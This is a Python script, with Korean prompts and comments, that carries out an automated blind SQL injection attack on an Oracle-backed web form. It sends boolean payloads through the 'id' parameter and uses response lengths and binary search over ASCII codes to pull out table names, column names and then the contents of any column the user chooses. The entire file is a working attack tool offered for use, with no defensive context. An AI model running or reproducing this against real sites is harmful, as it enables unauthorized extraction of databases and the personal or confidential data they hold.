import urllib.parse
import requests
from bs4 import BeautifulSoup as bs
import json
import re

url = ""
tlen = 0
flen = 0

import sys
import time
import threading

def loading():
    frames = [
        '  □□□□□□□□□□',
        '  ■□□□□□□□□□',
        '  ■■□□□□□□□□',
        '  ■■■□□□□□□□',
        '  ■■■■□□□□□□',
        '  ■■■■■□□□□□',
        '  ■■■■■■□□□□',
        '  ■■■■■■■□□□',
        '  ■■■■■■■■□□',
        '  ■■■■■■■■■□',
        '  ■■■■■■■■■■'
    ]
      
    frame_index = 0
    while getattr(threading.current_thread(), "do_run", True):
        frame = frames[frame_index % len(frames)]
        sys.stdout.write("\r" + "인젝션 중!" + frame)
        sys.stdout.flush()
        frame_index += 1
        time.sleep(0.2)
    sys.stdout.write("\r인젝션 완료!")
    sys.stdout.flush()

def sendData(atkquery):
    input_values = {'id': atkquery}
    data = urllib.parse.urlencode(input_values)
    headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}
    response = requests.post(url, data=data, headers=headers)
    return len(response.text)
    

def countTables():
    print("\n테이블 개수 검색중...")
    global tlen
    global flen
    comp = 0
    temp = 0
    count = 1
    for num in range(0, 20):

        atkquery = f"' or (SELECT COUNT(table_name) FROM user_tables) = { str(num) } -- " #어차피 table명은 문자로 시작하므로 다를 때 색출하면 됨
        temp = sendData(atkquery)

        if(comp != 0 and comp != temp):
            tlen = temp
            return count
        else:
            flen = temp
            comp = temp
        if(num!=0):
            count += 1

        

def searchTableName(count):
    print("\n테이블 이름 검색중...")
 
    loading_thread = threading.Thread(target=loading)
    loading_thread.start()

    global tlen
    global flen
    table_num = 1
    all_table_names = list()
    

    for table_num in range(1, count+1): #n번째 테이블 (rnum)
        letterNum = 1
        table_name = ""
        low = 33
        high = 128
        
        while 1: #n번째 글자 (substring)
            
            while low <= high: #아스키코드와 대조
                mid = (low + high) // 2
                atkquery = f"' or ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM = {table_num} ), {letterNum}, 1)) < {mid} -- "
    
                temp = sendData(atkquery)
                if(temp == tlen):
                    high = mid - 1
                else:
                    low = mid + 1
            
            letterNum += 1
            endquery = f"' or ASCII(SUBSTR((SELECT table_name FROM (SELECT ROWNUM AS RNUM, table_name FROM user_tables) WHERE RNUM = {table_num} ), {letterNum}, 1)) > 0 -- " #글자인지 빈칸인지 확인
        
            table_name += chr(low-1)
    
            if(sendData(endquery) != tlen):
                break
            low = 33
            high = 128
             
        all_table_names.append(table_name)
    
    loading_thread.do_run = False
    loading_thread.join()
   
    return all_table_names


def countColumns(table_name):
    print("\n컬럼 개수 검색중...")
    global tlen
    global flen
    comp = 0
    temp = 0
    count = 1
    for num in range(1, 20):

        atkquery = f"' or (SELECT COUNT(column_name) FROM all_tab_columns WHERE table_name='{table_name}') = { str(num) } -- " #어차피 column명은 문자로 시작하므로 다를 때 색출하면 됨
        temp = sendData(atkquery)

        if(comp != 0 and comp != temp):
            tlen = temp
            return count
        else:
            flen = temp
            comp = temp
        count += 1

        

def searchColumnName(count, table_name):
    print("\n컬럼 이름 검색중...")

    loading_thread = threading.Thread(target=loading)
    loading_thread.start()

    global tlen
    global flen
    column_num = 1
    all_column_names = list()
    
    for column_num in range(1,count+1): #n번째 컬럼 (rnum)
        letterNum = 1
        column_name = ""
        low = 33
        high = 128
        while 1:
            
            while low <= high:
                mid = (low + high) // 2
                atkquery = f"' or ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name ='{table_name}') WHERE RNUM = {column_num} ), {letterNum}, 1)) < {mid} -- "
    
                temp = sendData(atkquery)
                if(temp == tlen):
                    high = mid - 1
                else:
                    low = mid + 1
            
            
            letterNum += 1
            endquery = f"' or ASCII(SUBSTR((SELECT column_name FROM (SELECT ROWNUM AS RNUM, column_name FROM all_tab_columns WHERE table_name ='{table_name}') WHERE RNUM = {column_num} ), {letterNum}, 1)) > 0 -- "
        
            column_name += chr(low-1)
       
            if(sendData(endquery) != tlen):
                break
            low = 33
            high = 128
            
        all_column_names.append(column_name)

    loading_thread.do_run = False
    loading_thread.join()

    return all_column_names

def countData(table_name, column_name):
    print("\n컬럼 개수 검색중...")
    global tlen
    global flen
    comp = 0
    temp = 0
    count = 1
    for num in range(1, 20):

        atkquery = f"' or (SELECT COUNT({column_name}) FROM {table_name} ) = {str(num) } -- " #어차피 column명은 문자로 시작하므로 다를 때 색출하면 됨
        temp = sendData(atkquery)

        if(comp != 0 and comp != temp):
            tlen = temp
            return count
        else:
            flen = temp
            comp = temp
        count += 1

def searchDataName(count, table_name, column_name):
    print("\n데이터 검색중...")

    loading_thread = threading.Thread(target=loading)
    loading_thread.start()

    global tlen
    global flen
    data_num = 1
    all_data_names = list()

    for data_num in range(1, count+1):

        letterNum = 1
        data_name = ""
        low = 33
        high = 128
    
        while 1:
            
            while low <= high:
                mid = (low + high) // 2
                atkquery = f"' or ASCII(SUBSTR((SELECT {column_name} FROM (SELECT ROWNUM AS RNUM, {column_name} FROM {table_name}) WHERE RNUM = {data_num} ), {letterNum}, 1)) < {mid} -- "
    
                temp = sendData(atkquery)
                if(temp == tlen):
                    high = mid - 1
                else:
                    low = mid + 1
            
            
            letterNum += 1
            endquery = f"' or ASCII(SUBSTR((SELECT {column_name} FROM (SELECT ROWNUM AS RNUM, {column_name} FROM {table_name}) WHERE RNUM = {data_num} ), {letterNum}, 1)) > 0 -- "
        
            data_name += chr(low-1)
            if(sendData(endquery) != tlen):
                break

            low = 33
            high = 128

        all_data_names.append(data_name)

    loading_thread.do_run = False
    loading_thread.join()
    return all_data_names

def main():
    global url
    global tlen
    global flen
    count = 1
    url = input("Blind SQLi를 실행하고자 하는 URL을 입력해주세요:")

####테이블 확인####

    cT = countTables()
    print("테이블 개수 : ", str(cT))
    all_table_names = searchTableName(cT)
    print("\n\n---------------------------")
    for table in all_table_names:       
        print(f"{count}번째 테이블의 이름은 {table}")
        count += 1
    print("---------------------------\n\n")
    user_table_count = input("몇 번째 테이블의 컬럼을 출력할까요? 숫자하나만 입력해주세요: ")
    mytable = all_table_names[int(user_table_count) - 1]
    print("[선택한 테이블 : ", mytable, end=" ")
    print("]")

################
    count = 1
####컬럼 확인####
    
    cC = countColumns(mytable)
    print("컬럼 개수 : ", str(cC))
    all_column_names = searchColumnName(cC, mytable)
    print("\n\n---------------------------")
    for column in all_column_names:       
        print(f"{count}번째 컬럼의 이름은 {column}")
        count += 1
    print("---------------------------\n\n")
    user_column_count = input("몇 번째 컬럼의 데이터를 출력할까요? 숫자하나만 입력해주세요: ")
    mycolumn = all_column_names[int(user_column_count) - 1]
    print("[선택한 컬럼 : ", mycolumn, end=" ")
    print("]")
################
    count = 1
####데이터 확인##

    cD= countData(mytable, mycolumn)
    print("데이터 개수 : ", str(cD))
    all_data_names = searchDataName(cD, mytable, mycolumn)
    print("\n\n---------------------------")
    for data in all_data_names:       
        print(f"{count}번째 데이터의 이름은 {data}")
        count += 1
    print("---------------------------\n\n완료!")



if __name__ == "__main__":
    main()